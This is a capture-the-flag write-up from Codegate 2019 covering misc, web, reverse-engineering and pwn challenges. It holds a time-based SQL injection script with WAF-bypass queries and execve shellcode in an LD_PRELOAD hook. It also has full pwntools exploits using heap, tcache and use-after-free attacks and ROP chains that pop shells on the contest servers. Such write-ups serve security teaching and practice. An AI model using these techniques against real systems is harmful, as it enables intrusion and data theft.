# Codegate CTF 2019 Preliminary

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190126-codegatectf/) of this writeup.**


 - [Codegate CTF 2019 Preliminary](#codegate-ctf-2019-preliminary)
   - [Misc](#misc)
     - [MIC check](#mic-check)
     - [algo_auth](#algo_auth)
     - [mini converter](#mini-converter)
   - [Web](#web)
     - [Rich Project](#rich-project)
       - [Result](#result)
       - [Unintended solution for cracking the zip file](#unintended-solution-for-cracking-the-zip-file)
   - [Rev](#rev)
     - [PyProt3ct](#pyprot3ct)
   - [Pwn](#pwn)
     - [KingMaker](#kingmaker)
     - [cg_casino](#cg_casino)
     - [archiver](#archiver)
     - [20000](#20000)
     - [Maris_shop](#maris_shop)
     - [god-the-reum](#god-the-reum)
     - [aeiou](#aeiou)


We have some new team members in this CTF: kaibro, limbo, billy, tens, yuawn. Welcome them!

## Misc
### MIC check
Simple ascii 85 encoding. Just decode the string and we got the flag: `Let the hacking begins ~`
### algo_auth

> kaibro

Easy algorithm problem

we can use DFS to bruteforce the answer.

Here is my algorithm code(C++):

```cpp
#include <iostream>
using namespace std;

int best = 1e8;
int mx[7][7];

void dfs(int x, int y, int val) {

    if(val + mx[x][y] > best) return;

    if(x == 6) 
        best = min(best, val + mx[x][y]);
    if(x > 6 || x < 0 || y > 6 || y < 0) {
        if(x > 6 || (x == 6 && y < 0) || (x == 6 && y > 6)) 
            best = min(val, best);
        return;
    }

    dfs(x + 1, y, val + mx[x][y]);
    dfs(x, y - 1, val + mx[x][y]);
    dfs(x, y + 1, val + mx[x][y]);

}

int main() {
    ios_base::sync_with_stdio(0);
    for(int i = 0; i < 7; i++)
        for(int j = 0; j < 7; j++)
            cin >> mx[j][i];

    for(int i = 0; i < 7; ++i)
        dfs(0, i, 0);

    cout << best << endl;

    return 0;
}
```

After solving 100 stages, I got this message: `@@@@@ Congratz! Your answers are an answer`

But this is not flag.

In every stage, we can get a number of smallest path sum.

And this value will not change in different connections.

So I try to convert the numbers(ascii code) to characters in every stages, and I got this base64 string: 

`RkxBRyA6IGcwMG9vT09kX2owQiEhIV9fX3VuY29tZm9ydDRibGVfX3MzY3VyaXR5X19pc19fbjB0X180X19zZWN1cml0eSEhISEh`

Decode it, and get flag:

`echo RkxBRyA6IGcwMG9vT09kX2owQiEhIV9fX3VuY29tZm9ydDRibGVfX3MzY3VyaXR5X19pc19fbjB0X180X19zZWN1cml0eSEhISEh | base64 -d`

`FLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!`

### mini converter

> kaibro

The problem is on `puts input.unpack("C*#{input}.length")`

It put input to the string of unpack method

So we can control the result of unpack to leak flag.

In Ruby unpack format, `@` can `skip to the offset given by the length argument`

If we assign a large positive number to it, the number will overflow to negative number.

Then we can leak previous content, including the `flag`.

Payload:

`nc 110.10.147.105 12137 | strings | grep flag`

and then paste `@18446744073708410316A1150000`, `1` repeatedly.

```
$ nc 110.10.147.105 12137 | strings | grep flag
@18446744073708410316A1150000
1

$(cflags)  -fPIC
 $(DEFS) $(cppflags)
$(cxxflags)
DEFS) $(cppflags)
cflags
cppflags
cxxflags
optflags
debugflags
warnflags
strict_warnflags
flags

@18446744073708410316A1150000
1

flag
flag
$(optflags) $(debugflags) $(warnflags)
flag = "FLAG{Run away with me.It'll be the way you want it}"
```


## Web
### Rich Project

> bookgin, kaibro


After scanning, I found:

`http://110.10.147.112/robots.txt`

```
User-agent : *
Disallow: /top_secret.zip
Disallow: /
```



But the zip file has an unknown password, and there is a file `ZIP PASS = MASTER_PW` in it.

So we need to find the MASTER's password first.

<br>

And then I found a SQL Injection in the register page. (http://110.10.147.112/?p=reg)

The point of SQL Injection is on `ac` parameter.

If we input `'||sleep(10)||'1` on `ac`, it will sleep 10 seconds.

So I guess the SQL query may look like `INSERT INTO xxx VALUES ('id', 'pw', 'ac')`

(after input `1'+'2`, the value of ac in `/?p=info` is `3`)

<br>

After fuzzing, I found that there is WAF behind the website.

If I input `group_concat`, `group by`, `where`, `order`, `limit`, `'''`, `''''`, ..., the response text is `no hack`.

I can still dump some basic information by this script (time based sql injection):

```python
import requests
import random
import time

while True:
    sql = raw_input(":")

    res = ''
    for tl in range(30):
        l = 20
        r = 140
        while l <= r:
            if l == r:
                res += chr(l)
                print(l, chr(l))
                print(res)
                break
            m = (l + r) // 2
            print "now:"+str(m)
            ac = "'||if(ascii(mid({},{},1))>{}, sleep(2),1)=1||'1".format(sql, tl+1, m)
            t1 = int(time.time())
            req = requests.post("http://110.10.147.112/?p=reg", data={'id':'kaizzzbro666'+str(random.randint(1,500)),'pw':'kaibro', 'ac':ac})
            # print r.text
            t2 = int(time.time())

            if t2 - t1 >= 2:
                l = m + 1
            else:
                r = m
```

```
user(): db_manager@localhost
database(): userdata
version(): 5.7.25-0ubuntu0.18.04.2
```

But it is a little hard to dump schema name, table name, column name by this script.

After discussing, we found a method can dump schema_name, table_name and column_name:

- Dump table name
    - `0' |(select count(*) from (select table_schema,table_name from information_schema.tables having table_schema !="sys" and table_schema !="mysql" and table_schema !="performance_schema" and table_schema !="information_schema" and table_name regexp "[a-z].*") as b)| '0`

(if the regex pattern matches, the value of ac in the info page will show a number > 0)

- Dump column name
    - `0' |(select count(*) from (select column_name from information_schema.columns having table_name="users" and column_name regexp ".*") as b)| '0`
- Dump data
    - `0' |(select count(*) from (select id, pw from userdata.users having id="MASTER" and pw regexp ".*") as b)| '0`

Because the account number is a signed 8-byte integer, we can use `hex(mid((select pw from (select id, pw from userdata.users having id="admin") as b), 1, 8))` to extract 8 bytes of the SHA1 password at once.

#### Result

there is two tables in the userdata db:

- `users`
    - `id`
    - `pw`
    - `ac`
- `user_wallet`

And we found a user `MASTER` with password `master` and ac `master`, but this is fake user lol.

There is another user `admin` with password `hacker` and ac `ADMIN_ACC0UNTS`.

After login as `admin`, we can view the `TOP SECRET` now:

```
They are manipulating the price of coins!! 
How can this be? When I knew that, I decided to expose that.
Fortunately, I have a MASTER PASSWORD (not flag). It is..


'D0_N0T_RE1E@5E_0THER5'
Also, they have set up evidence to not be searched(googling). 
If you read this message, please found evidence and expose it.
```

so the password of zip file is `D0_N0T_RE1E@5E_0THER5`.

I found there is a logic vulnerabilty in `reserv.php` after code review.

we can assign arbitrary number to `$_POST['amount']` in `reserv.php`, and it will update the amount of `user_wallet`:

```
http://110.10.147.112/?p=reserv
code=D0_N0T_RE1E@5E_0THER5&date=2019-01-29&amount=1000000000
```

Then, we can sell our coins to gold in `sell.php`.

If we got `cash >= 999999999`, we can buy the flag in `pay.php`:

![](https://i.imgur.com/zkWpfpq.png)


http://110.10.147.112/?key=D0_N0T_RE1E@5E_0THER5&p=pay

`FLAG{H0LD_Y0UR_C0IN_T0_9999-O9-O9!}`

#### Unintended solution for cracking the zip file

Since there are a few files with known plaintext, one can crack the zip using [zip plaintext attack](https://github.com/hyperreality/ctf-writeups/blob/master/2019-codegate/README.md#cracking-the-zip). What a clever approach! This approach is credited to @hyperreality.


## Rev
### PyProt3ct
> limbo

We were given the challenge's source code ( python ). By checking the source code, we know that `play.py` is responsible for the flag checking logic. However it's been obfuscated:
```python
def O0O0OOO00OO00O000(OOOO0OOOO000OO000):
    O00OOOOOO000OOO00=2001
    OOO0OOOOOOO0O00O0=2002
    O0O00000000OO0OO0=OOOO0OOOO000OO000[O00OOOOOO000OOO00]
    O0O00000000OO0OO0=O0O00000000OO0OO0.decode("utf-8")
    OOOOO0OOO0OOO0O0O=OOOO0OOOO000OO000[OOO0OOOOOOO0O00O0]
    OOOOO0OOO0OOO0O0O=OOOOO0OOO0OOO0O0O.decode("utf-8")
    OOOOO0OOO0OOO0O0O=int(OOOOO0OOO0OOO0O0O)
...............................
```

We have to recover the flag checking logic manually. Here's the de-obfuscated version ( pseudo-code ):

```python
#!/usr/bin/env python

def do(x):
    a = x >> 32
    a ^= 0xffc2bdec
    a += 0xffc2bdec
    a &= 0xffffffff

    b = x & 0xffffffff
    b ^= 0xffc2bdec
    b += 0xffc2bdec
    b &= 0xffffffff

    c = ((b << 32) | a)&0xffffffffffffffff
    d = ((c & 0x7f) << 57)&0xffffffffffffffff

    return ((c >> 7) | d) & 0xffffffffffffffff

flag = raw_input("flag:").strip()
now = int("0x" + flag.encode('hex'), 16)

for _ in xrange(0x7f):
    now = do(now)

print(hex(now))
assert now == 0xd274a5ce60ef2dca
```

We can see that it's just some bit rotation and some xor/add operations. Just write a script and recover the flag:

```python
#!/usr/bin/env python

def undo(x):
    c = ((x << 7) | (x >> 57))&0xffffffffffffffff
    b = ((((c >> 32)&0xffffffff)-0xffc2bdec)&0xffffffff)^0xffc2bdec
    a = (((c&0xffffffff)-0xffc2bdec)&0xffffffff)^0xffc2bdec
    return ((a << 32) | b)&0xffffffffffffffff

now = 0xd274a5ce60ef2dca
for _ in xrange(0x7f):
    now = undo(now)

print(hex(now)) # hex string of the flag
print(hex(now)[2:-1:].decode('hex')) # unhex the string to get the flag

```

flag: `d34dPY27`

## Pwn
### KingMaker

> yuawn
> 
The binary will xor the opcodes of some functions dynamically, we can find out the key by xor it with predictable opcodes.
* patch<span></span>.py:

```python
#!/usr/bin/env python

s = open( 'KingMaker' ).read()
new = open( './KingMaker.patched' , 'w+' )

k = [ 'lOv3' , 'D0l1' , 'HuNgRYT1m3' , 'F0uRS3aS0n' , 'T1kT4kT0Kk' ]

p = [
    (0x330f,0xf0,1) , (0x33ff,0x1e,1) , (0x341d,0xf0,1) , (0x32c0,0x1e,1) , (0x32de,0x31,1) , (0x3197,0x129,1) , (0x30d4,0xc3,1),
    (0x2D55,0xfa,2) , (0x2c25,0x112,2) , (0x2d37,0x1e,2) , (0x27e9,0x44,2) , (0x29b9,0xe6,2) , (0x2b2b,0xfa,2) , (0x271c,0xcd,2) , (0x28b5,0xe6,2) , (0x299b,0x1e,2) , (0x2a9f,0x4e,2) , (0x2aed,0x3e,2),
    (0x282d,0x44,2) , (0x2871,0x44,2),
    (0x20e2,0x18d,3) , (0x201f,0xc3,3),
    (0x1b0a,0xf0,4) , (0x19f2,0xfa,4) , (0x1aec,0x1e,4) , (0x192c,0xa8,4) , (0x19d4,0x1e,4) , (0x16d0,0xc3,4),
    (0x11BB,0x131,5) , (0xf25,0xDC,5) , (0x108b,0x130,5) , (0xde7,0x120,5) , (0xf07,0x1e,5) , (0x1001,0x1e,5) , (0x101f,0x4e,5) , (0x106d,0x1e,5) , (0xC8C,0x15B,5)
]
p.sort( key=lambda x:x[0] )

ss = ''
now = 0
for i , l , kn in p:
    ss += s[now:i]
    for j in xrange( l ):
        ss += chr( ord( s[ i + j ] ) ^ ord( k[ kn - 1 ][j % len( k[ kn - 1 ] )] ) )
    now = i + l

ss += s[now:]

new.write(ss)
new.close()
```

After some reversing.....
* find_solution.py:

```python
#!/usr/bin/env python
import itertools

init = [(0,1,1,2,0)]
a = [(2,0,0,1,0),(2,0,1,0,0),(2,0,2,1,0)]
b = [(0,0,1,0,2),(0,-1,0,0,-1),(0,2,0,0,0)]
c = [(-1,0,-1,1,0),(1,1,0,0,0),(1,2,0,0,0)]
d = [(1,1,0,2,0),(1,1,1,2,0),(1,1,1,1,2),(1,2,2,1,2)]
e = [(0,0,1,1,0),(0,-1,2,0,0),(0,-1,1,1,0)]
f = [(1,-1,-1,2,2),(0,0,0,0,0),(1,0,0,0,1)]
g = [(0,1,1,1,0),(0,1,0,0,0)]
h = [(-1,0,0,1,1),(0,0,1,2,1),(0,0,0,2,2)]

for i in itertools.product( init , a , b , c , d , e , f , g , h ):
    found = 1
    for j in xrange( 5 ):
        sum = 0
        for k in i:
            sum += k[j]
        if sum != 5:
            found = 0
    if found:
        print i
        break
```

* flag.py:


```python
#!/usr/bin/env python
from pwn import *

# He_C@N'T_see_the_f0rest_foR_TH3_TRee$

host , port = '110.10.147.104' , 13152
y = remote( host , port )

#ori = '\x55\x48\x89\xe5'
#enc = '\x39\x07\xff\xd6'
#key1 = ''.join( chr( ord(ori[_]) ^ ord(enc[_]) ) for _ in xrange(4) )
#key1 = 'lOv3'

```

```
0x403197

1> Kill the enemy       2 0 0 1 0
2> Capture the captive  2 0 1 0 0
3> Just release         2 0 2 1 0

0x402FCF break time

1> Spend time with orphanage children.  0  0  1  0  2
2> Host a big party.                    0 -1  0  0 -1
3> Read a book in the room.             0  2  0  0  0

0x402E4F test 2

0x402c25 brother
1> I will take the coin from servant.  -1  0  -1  1  0
2> I will go out.
    1> Yes I will buy.
        1> I will sell the apple with yelling to the crowd, 'I'm the prince of this kingdom!'  1 1 0 0 0
        2> I will sell the apple after I wash this apple really cleary.                        1 1 0 0 0
    2> No I will not.   LOSE
3> I will go to my brother and discuss about this.
    1> Rock, Scissors, Paper            1 2 0 0 0
    2> Fight                            lose

0x40266a break 2
1> Go to suppress the rebellion by force.
    1> Yes I am.
        1> Execute                  1 1 0 2 0
        2> Imprisonment             1 1 1 2 0
    2> No I'm not. SAME
2> Go to persuade the brother.
    1> I understand you mind, but this is a rebellion against father. Surrender and apologize to father.   1 1 1 1 2
    2> I understand you mind, but now you have to accept the result. Even if you are not a king, there are many things you can do for other kingdom. I will find a way with you.
        1 2 2 1 2

0x40226d test 3

0x4020e2 test 3 entry
1> He caused the revolt, so execute him without mercy.                                                              0  0  1  1  0
2> Although he caused the revolt but he had a lot of accomplish, so send him to the other country as a diplomat.    0 -1  2  0  0  , 0 -1 0 2 0
3> He caused the revolt. Deprive his royal status and send him into exile.                                          0 -1  1  1  0 


break 3
1> Yes I think.
    1> Kill secretly. LOSE
    2> Give money and send to other country. 1 -1 -1 2 2
2> Nope!
    1> I will not eat it.                                       0 0 0 0 0
    2> I will eat it alone. XXXX
    3> I will call 6th prince and make him to eat it first.     1 0 0 0 1

0x401BFA test 4 key
0x401B0A test 4 entry
1> Yes I am.
    1> Yes I can.
    2> No I can't XXXX
2> No I'm not.  XXXX

0x401609 break 4
1> Go for a walk.
    1> Yes I do.
        1> Go to see the king.  XXXX
        2> Go to my room and waiting.   0 1 1 1 0
    2> No I don't                       0 1 0 0 0
2> Just stay in room                    0 1 0 0 0

0x4011BB test 5 entry
1> I will give up.    XXXX
2> I will find the diplomat.
    1> Go to the bar where he visit often.
        1> Give him to the king and waiting for the result.                         -1 0 0 1 1
        2> Tell the king that you want to investigate him and send him into exile.   0 0 1 2 1
    2> Find the family first. XXXX
3> I will go to the other country.
    1> We must go. Keep going with 2nd prince.  XXXX
    2> You send him home and you keep going.                                         0 0 0 2 2
    3> Go home together. XXXX

0x400C8C final
1> Don't enter the room. XXXX
2> Enter the room.
    1> Yes I do. flag
    2> No I don't. XXXX



(2, 0, 1, 0, 0) (0, 2, 0, 0, 0) (1, 1, 0, 0, 0) (1, 1, 1, 1, 2) (0, -1, 2, 0, 0) (1, 0, 0, 0, 1) (0, 1, 0, 0, 0) (0, 0, 0, 2, 2)
```

```
y.sendlineafter( 'Look around' , '1' )
y.sendlineafter( 'test 1' , 'lOv3' )
y.sendlineafter( 'No I\'m not' , '1' )
y.sendlineafter( 'I will wear the armor for body, arm, leg and helmet.' , '2' )
y.sendlineafter( '3> Just release' , '2' ) # 2 0 0 1 0
y.sendlineafter( '3> Read a book in the room.' , '3' ) # 0, 2, 0, 0, 0
# 2 2 0 1 0

y.sendlineafter( 'Enter the key for test 2' , 'D0l1' )
y.sendlineafter( 'No I\'m not' , '1' )
y.sendlineafter( '3> I will go to my brother and discuss about this.' , '2' )
y.sendlineafter( '2> No I will not.' , '1' )
y.sendlineafter( '2> I will sell the apple after I wash this apple really cleary.' , '2' ) # 1 1 0 0 0
# 3 3 1 0 0

y.sendlineafter( '2> Go to persuade the brother.' , '2' )
y.sendlineafter( '2> I understand you mind, but now you have to accept the result. Even if you are not a king, there are many things you can do for other kingdom. I will find a way with you.' , '1' )
# 1 1 1 1 2
# 4 4 2 1 2

y.sendlineafter( 'Enter the key for test 3' , 'HuNgRYT1m3' )
y.sendlineafter( '3> He caused the revolt. Deprive his royal status and send him into exile.' , '2' ) # (0, -1, 2, 0, 0) (0, -1, 0, 2, 0)
# 4 3 4 1 2

y.sendlineafter( '2> Nope!' , '2' )
y.sendlineafter( '3> I will call 6th prince and make him to eat it first.' , '3' ) # (1, 0, 0, 0, 1)
# 5 3 3 2 3

y.sendlineafter( 'Enter the key for test 4' , 'F0uRS3aS0n' )
y.sendlineafter( '2> No I\'m not.' , '1' )
y.sendlineafter( '2> No I can\'t' , '1' )

t = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
e = 'ALICEAWTQJMJXTSPPZVCIDGQYRDINMCP'
a = 'ALICE'
p = ''
j = 0
for c in e[5:]:
    i = t.index( c ) - ( ord( a[j] ) - 65 ) + 65
    p += chr(i)
    j = (j + 1) % 5

y.sendlineafter( 'King : You have only 1 chance.' , a + p ) # 0 1 1 2 0
# 5 4 4 4 3

y.sendlineafter( '2> Just stay in room' , '2' ) # (0, 1, 0, 0, 0)
# 5 5 4 4 3

y.sendlineafter( 'Enter the key for test 5' , 'T1kT4kT0Kk' )
y.sendlineafter( '3> I will go to the other country.' , '3' )
y.sendlineafter( '3> Go home together.' , '2' )
y.sendlineafter( '2> Enter the room.' , '2' )
y.sendlineafter( '2> No I don\'t.' , '1' )

y.interactive()
```

### cg_casino
> yuawn, Billy, limbo, tens
> 
Use stack overflow to overwrite the `environ` on the stack, so that we can use `/proc/self/environ` to control the content of file.
Upload `hook.so`.

* hook.S:

```nasm
; nasm -f elf64 hook.S -o hook.o && ld --shared hook.o -o hook.so
; ubuntu 16.04 GNU ld (GNU Binutils for Ubuntu) 2.26.1
[BITS 64]
	global getenv:function
	section .text
getenv:
	mov rax, 0x68732f6e69622f
	push rax
	mov rdi, rsp
	xor esi, esi
	push 0x3b
	pop rax
	cdq
	syscall
```

Overwrite `LD_PRELOAD` in `environ` with `./hook.so`, trigger `system("/usr/bin/clear")` in `slot_machine` function. `getenv()` will called by `/usr/bin/clear`, and be hooked on to our shellcode.

* flag.py:

```python
#!/usr/bin/env python
from pwn import *

# CODEGATE{24cb1590e54e43b254c99404e4f86543}

context.arch = 'amd64'
host , port = '110.10.147.113' , 6677

def put( voucher ):
    y.sendlineafter( '6) exit' , '1' )
    y.sendlineafter( 'input voucher :' , voucher )

def mer( fromm ):
    y.sendlineafter( '6) exit' , '2' )
    y.sendlineafter( 'input old voucher :' , fromm )

def lot( a ):
    y.sendlineafter( '6) exit' , '3' )
    for i in a:
        y.sendline( i )

def slot():
    y.sendlineafter( '6) exit' , '5' )
    y.sendlineafter( 'press any key' , '' )

'''
maps
mem
stack
environ
'''

while True:
    y = remote( host , port )

    slot()
    p = [ '1' , '+' , '+' , '1' , '+' , '1' , '1' , '1'  ]
    lot( p )

    y.recvuntil( '===================' )
    y.recvuntil( '===================\n' )
    stk = int( y.recvuntil( ' :' )[:-2] )
    y.recvline()
    stk += int( y.recvuntil( ' :' )[:-2] ) << 32
    success( 'stack -> %s' % hex( stk ) )

    env = (( stk + 0x2000 ) & 0xfffffffff000) + 0x273
    info( 'environ -> %s' % hex( env ) )

    p = flat(
        0, stk + 0x110,
        0, 0,
        0, 0,
        1, stk + 0x1169, # argv
        0, env , # envp
        env + 0x42, 0,
    ).ljust( 0xc0 , '\x00' )

    hook = open( './hook.so' ).read().replace( '\n' , '\x00' )

    hook_so = 'ho0o0o0o0o0o0o0o0o0o0o0o0o0o0k'
    version = '.00'
    put( hook_so + version )

    mer( ('/proc/self/environ'.rjust( 0x20 , '/' ) + '\x00' * ( 0xd0 - 0x20 ) + p).ljust( env - stk - 0x70, '\x00' ) + hook )

    try:
        y.sendlineafter( '6) exit' , '6' )
        y.close()
        success( 'Upload hook.so succeed!' )
        break
    except:
        y.close()

y = remote( host , port )

slot()
p = [ '1' , '+' , '+' , '1' , '+' , '1' , '1' , '1'  ]
lot( p )

y.recvuntil( '===================' )
y.recvuntil( '===================\n' )
stk = int( y.recvuntil( ' :' )[:-2] )
y.recvline()
stk += int( y.recvuntil( ' :' )[:-2] ) << 32
success( 'stack -> %s' % hex( stk ) )

mer( ('a' * 0x40 + "LD_PRELOAD=./" + hook_so + version ).ljust( 0x128 , '\x00' ) + p64( stk + 0xb0 ) + p64( 0 ) ) 

y.sendlineafter( '>' , '5' )
y.sendlineafter( 'press any key' , '7' ) # hooked !

y.sendline( 'cat ../f*' )

y.interactive()
```
### archiver

> yuawn, tens
> 
* flag.py

```python
#!/usr/bin/env python
from pwn import *

# YouNeedReallyGoodBugToBreakASLR!!

context.arch = 'amd64'
host , port = '110.10.147.111' , 4141
y = remote( host , port )


def read_heap( count , data ):
    return p8( (0<<6) + count ) + data

def store_heap( i ):
    return p8( (3<<6) + i )

def load_heap( i , j ):
    return p8( (1<<6) + i ) + p8( j )

def new_heap_loop( count ):
    return p8( (2<<6) + count )


p = ''
p += "\xc0\xd3\x94#2019"
p += p64( 0x77777770 )

p += store_heap( 0x34 )           # store output_func() to heap
p += load_heap( 0x33 , 1 )        # load it to Compress->size

p += new_heap_loop( 0x1c0 / 8 )   # Compress->size += 0x1c0 -> output_func() + 0x1c0 = cat_falg()

p += store_heap( 0x33 )           # store cat_flag() to heap 
p += load_heap( 0x34 , 1 )        # load cat_flag() to Compress->func_ptr
                                  # Trigger Compress->func_ptr, trigger cat_flag()
y.send( p32( len( p ) ) )
y.send( p )

y.interactive()
```

### 20000
> limbo, tens
>

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random

binary = "./20000"
context.binary = binary
elf = ELF(binary)
if __name__ == '__main__':
  i=20000
  while 1:
    print i
    r = process("20000")
    r.recv(1000)
    r.sendline(str(i))
    r.recv(1000)
    r.sendline("%s"*0x200)
    r.wait()
    c = r.poll()
    if c !=0:
      r.interactive()
    r.close()
    i-=1
```



```
17394
[+] Starting local process './20000': pid 118780
[*] Process './20000' stopped with exit code -6 (SIGABRT) (pid 118780)
[*] Switching to interactive mode
sh: 1: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s@: not found
*** stack smashing detected ***: <unknown> terminated
```

find 17394

lib_17394.so
```
    read(0, buf, 0x32uLL);
    v3(buf, buf);
    v4(buf);
    sprintf(s, "%s 2 > /dev/null", buf);
    system(s);
```

input "sh" get shell

`flag{Are_y0u_A_h@cker_in_real-word?}`

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '110.10.147.106'
port = 15959

binary = "./20000"
context.binary = binary
elf = ELF(binary)

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  pass
else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil("PUT : ")
  r.sendline("17394")
  r.recvuntil("?\n")
  r.sendline("sh")
  r.sendline("cat flag")
  r.interactive()
```

### Maris_shop
> Billy
* Raise the money by integer overflow
* Buy 16 different items and it will free all and leave last item unclear.
* UAF on unsorted bin, we can leak libc address and do unsortedbin attack
* Overwrite stdin->_IO_buf_end by unsortedbin attack
* Calling fgets will overwrite the stdin->vtable
* Jump to one_gadget and get shell

```python=
from pwn import *

#r = process(["./Maris_shop"],env={"LD_PRELOAD":"./libc.so.6"})
r = remote("110.10.147.102", 7767 )
#r.interactive()
r.sendlineafter(":","1")
r.recvline()
price = int(r.recvline().split('-')[-1])
num = 0xffffd8f0/price
r.sendlineafter(":","1")
r.sendlineafter(":",str(num))
r.sendlineafter(":","4")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

have = []
while len(have) < 16:
	r.sendlineafter(":","1")
	r.recvline()
	total = [ r.recvline().split(".")[-1] for _ in range(6)]

	for i in range(6):
		if total[i] not in have:
			have.append(total[i])
			r.sendlineafter(":",str(i+1))
			r.sendlineafter(":","1")
			break
		elif i==5:
			r.sendlineafter(":","7")
                        r.sendlineafter(":","1")


have[0] = ""
r.sendlineafter(":","4")
r.sendlineafter(":","1")
r.sendlineafter(":","0")
while len(have) < 17:
        r.sendlineafter(":","1")
        r.recvline()
        total = [ r.recvline().split(".")[-1] for _ in range(6)]

        for i in range(6):
                if total[i] not in have:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","1")
                        break
                elif i==5:
                        r.sendlineafter(":","7")


r.sendlineafter(":","4")
r.sendlineafter(":","2")
r.sendlineafter(":","1")
have = [have[-1]]
while len(have) < 3:
        r.sendlineafter(":","1")
        r.recvline()
        total = [ r.recvline().split(".")[-1] for _ in range(6)]

        for i in range(6):
                if total[i] not in have:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","1")
                        break
                elif i==5:
                        r.sendlineafter(":","7")

r.sendlineafter(":","4")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","15")

r.recvuntil("Amount:")
libc = int(r.recvline()) - 0x3c4b78
print hex(libc)

while len(have)<4:
	r.sendlineafter(":","1")
        r.recvline()
	total = [ r.recvline().split(".")[-1] for _ in range(6)]
        for i in range(6):
		if total[i] ==  have[1]:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","-616")
                        break
                elif i==5:
                        r.sendlineafter(":","7")

have = have[:-1]
while len(have) < 4:
        r.sendlineafter(":","1")
        r.recvline()
        total = [ r.recvline().split(".")[-1] for _ in range(6)]

        for i in range(6):
                if total[i] not in have:
                        have.append(total[i])
                        r.sendlineafter(":",str(i+1))
                        r.sendlineafter(":","1")
                        break
                elif i==5:
                        r.sendlineafter(":","7")

context.arch = "amd64"
data =[libc+0x3c6790,0,libc+0xf02a4] + [0]*7 + [libc+0x3c4950]
payload = "\x00"*5+flat(data)

r.sendlineafter(":",payload)
r.interactive()


```
### god-the-reum
> Billy
* Tcache was introduced in libc-2.27
* There are double free and UAF bugs in this binary
* Free a unsorted bin to leak libc address
* Use tcache attack to malloc at __free_hook
* Overwrite __free_hook with one_gadget
* Free and get shell

```python=

from pwn import *

#r = process(['god-the-reum'])
r = remote("110.10.147.103", 10001)
r.sendlineafter(":","1")
r.sendlineafter(":","1280")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

r.sendlineafter(":","3")
r.sendlineafter(":","0")
r.sendlineafter(":","1280")

r.sendlineafter(":","4")
r.recvuntil("ballance ")
libc = int(r.recvline())-0x3ebca0
print hex(libc)

r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","0")
r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

r.sendlineafter(":","6")
r.sendlineafter(":","1")
r.sendlineafter(":",p64(libc+0x3ed8e8))

r.sendlineafter(":","1")
r.sendlineafter(":","0")
r.sendlineafter(":","1")
r.sendlineafter(":","0")
r.sendlineafter(":","6")
r.sendlineafter(":","3")
r.sendlineafter(":",p64(libc+0x4f322))

r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","0")



r.interactive()
```

### aeiou
> tens

trial and error....

input

```
payload = "D"*0x2000
Tn(len(payload),payload)
```
No crash but the program hangs.
```
payload = "\x00"*0x2000
Tn(len(payload),payload)
```
Successfully bypass stack canary and overwrite ret address to 0.
```
payload = "\x00"0x1018 + "D"0x200 + "\x00"*0x800
Teaching_numbers(len(payload),payload)
```
Overwrite ret address to 0x4444444444444444

ROP and get shell

`FLAG{CheEr_Up!_If_you_4re_pRepareD_t0_ad4pt_aNd_lEaRN,you_C4n_41lC1ear}`


```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '110.10.147.109'
port = 17777

binary = "./aeiou"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

def Tn(size,data):
  r.recvuntil(">>")
  r.sendline("3")
  r.recvuntil("!")
  r.sendline(str(size))
  r.send(data)


puts_plt = 0x0400B58
pop_rdi = 0x00000000004026f3
pop_rsi_15 = 0x00000000004026f1
pop_rsp_3 = 0x00000000004026ed
puts_got = 0x0603F50

buf = 0x00605000-0x200
read_plt = 0x000400B88

if __name__ == '__main__':
  payload = ("\x00"*0x1018 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +
            p64(pop_rdi) + p64(0) + p64(pop_rsi_15) + p64(buf) + p64(0) + p64(read_plt) +
            p64(pop_rsp_3) + p64(buf-0x18) +
            "\x00"*0x800)
  Tn(len(payload),payload)
  r.recvuntil("ou :)\n")
  libc.address = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - libc.symbols['puts']
  print("libc.address = {}".format(hex(libc.address)))
  r.sendline(p64(libc.address+0x4526a))
  r.interactive()
```
